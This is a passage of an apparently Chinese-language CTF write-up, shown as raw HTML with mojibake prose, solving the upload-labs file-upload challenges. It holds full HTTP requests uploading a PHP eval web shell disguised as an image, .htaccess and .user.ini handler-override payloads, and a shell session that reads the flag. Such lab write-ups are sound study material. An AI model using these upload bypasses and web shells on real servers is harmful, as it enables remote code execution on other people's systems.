AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81/Pass-01/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[nacl]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸Šä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>ä¹‹åèšå‰‘è¿æ¥å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(*) åŸºç¡€ä¿¡æ¯</span><br><span class="line">å½“å‰è·¯å¾„: /var/www/html/upload</span><br><span class="line">ç£ç›˜åˆ—è¡¨: /</span><br><span class="line">ç³»ç»Ÿä¿¡æ¯: Linux out 4.19.221-0419221-generic <span class="comment">#202112141049 SMP Tue Dec 14 11:54:51 UTC 2021 x86_64</span></span><br><span class="line">å½“å‰ç”¨æˆ·: www-data</span><br><span class="line">(*) è¾“å…¥ ashelp æŸ¥çœ‹æœ¬åœ°å‘½ä»¤</span><br><span class="line">(www-data:/var/www/html/upload) $ <span class="built_in">cd</span> /</span><br><span class="line">(www-data:/) $ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">init-scripts</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/) $ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;2e4c9e92-0a87-448f-816b-7dd80815b03e&#125;</span><br><span class="line">(www-data:/) $</span><br></pre></td></tr></table></figure><h2 id="Pass-02-MIMEç»•è¿‡"><a href="#Pass-02-MIMEç»•è¿‡" class="headerlink" title="Pass-02(MIMEç»•è¿‡)"></a>Pass-02(MIMEç»•è¿‡)</h2><p>æ­¤é¢˜ä¸ºmimeç»•è¿‡,ç”±äºç¬¬ä¸€é¢˜æˆ‘ä»¬ä¹Ÿå°†mimeæ›´æ”¹äº†æ‰€ä»¥ä¸ç¬¬ä¸€é¢˜pocç›¸åŒ</p><h2 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03(é»‘åå•ç»•è¿‡)"></a>Pass-03(é»‘åå•ç»•è¿‡)</h2><p>è¿™å…³ä¸ºé»‘åå•éªŒè¯,ä½†æ˜¯é»‘åå•å¹¶ä¸å…¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨.phtmlç­‰ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220135850240.png" alt="image-20240220135850240"></p><h2 id="Pass-04-htaccessç»•è¿‡é»‘åå•"><a href="#Pass-04-htaccessç»•è¿‡é»‘åå•" class="headerlink" title="Pass-04(.htaccessç»•è¿‡é»‘åå•)"></a>Pass-04(.htaccessç»•è¿‡é»‘åå•)</h2><p>ä»ç„¶æ˜¯é»‘åå•,ä½†æ˜¯å¢åŠ äº†ä¸å°‘phpçš„åç¼€,ä¸è¿‡å¯ä»¥å¯ä»¥ä¸Šä¼ .htaccessæ¥ç»•è¿‡</p><p>.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line"></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php?action=show_code</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>380</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryAlCaT8MY9dXGKBFo</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.htaccess&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;FilesMatch &quot;png&quot;&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">  SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">ä¸Šä¼ </span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarycJmFOOAI4Dq9bwue</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.png&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸Šä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220141436068.png" alt="image-20240220141436068"></p><h2 id="Pass-05-å¤§å°å†™ç»•è¿‡"><a href="#Pass-05-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-05(å¤§å°å†™ç»•è¿‡)"></a>Pass-05(å¤§å°å†™ç»•è¿‡)</h2><p>åˆç¦äº†.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ²¡æœ‰ç¦.php7ä½†æ˜¯è¿™é‡Œä¸Šä¼ .php7å¹¶ä¸èƒ½è¢«è§£æ</p><p>æŸ¥çœ‹æºç ä¸å‰å‡ å…³å¯¹æ¯” å‘ç°è¿™é‡Œå¹¶æ²¡æœ‰ä¸‹é¢è¿™è¡Œ å°†æ–‡ä»¶åç¼€åç»Ÿä¸€è½¬æ¢ä¸ºå°å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ .phPæ¥ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142700111.png" alt="image-20240220142700111"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142713513.png" alt="image-20240220142713513"></p><h2 id="buu-upload-labs-windows-Pass-05-user-iniç»•è¿‡"><a href="#buu-upload-labs-windows-Pass-05-user-iniç»•è¿‡" class="headerlink" title="(buu upload-labs windows)Pass-05(.user.iniç»•è¿‡)"></a>(buu upload-labs windows)Pass-05(.user.iniç»•è¿‡)</h2><p>è¿™å…³åœ¨BUU upload-labs windowsä¸­,ç¦äº†.htaccess</p><p>ä½†åœ¨upload&#x2F;ä¸‹å­˜åœ¨ä¸€ä¸ªreadme.php, å¹¶ä¸”æ²¡æœ‰ç¦.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220145259013.png" alt="image-20240220145259013"></p><p>å› æ­¤å¯ä»¥æ„é€ .user.iniæ¥ä½¿readme.phpåŒ…å«æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶</p><blockquote><p> php.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ªphp.iniï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨ã€‚ </p><p><strong>å®ä¾‹</strong></p><p>php é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€äº›ä½œç”¨</p><blockquote><p>auto_prepend_file &#x3D; <filename>     &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å¤´<br>auto_append_file &#x3D; <filename>      &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å°¾</p></blockquote><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg</span><br></pre></td></tr></table></figure><p>1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œbuuçš„window upload-labsé¶æœºä¼¼ä¹æœ‰ç‚¹é—®é¢˜,æ‰€ä»¥æˆ‘å°±åœ¨æœ¬åœ°windowç¯å¢ƒæ­å»ºäº†ä¸€ä¸ªé¶æœºè¿›è¡Œæµ‹è¯•</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>332</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary04B3H7j2HCxrhZa6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = shell.jpg</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">ä¸Šä¼ </span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>311</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryB0UdjI6DB38pICSw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: 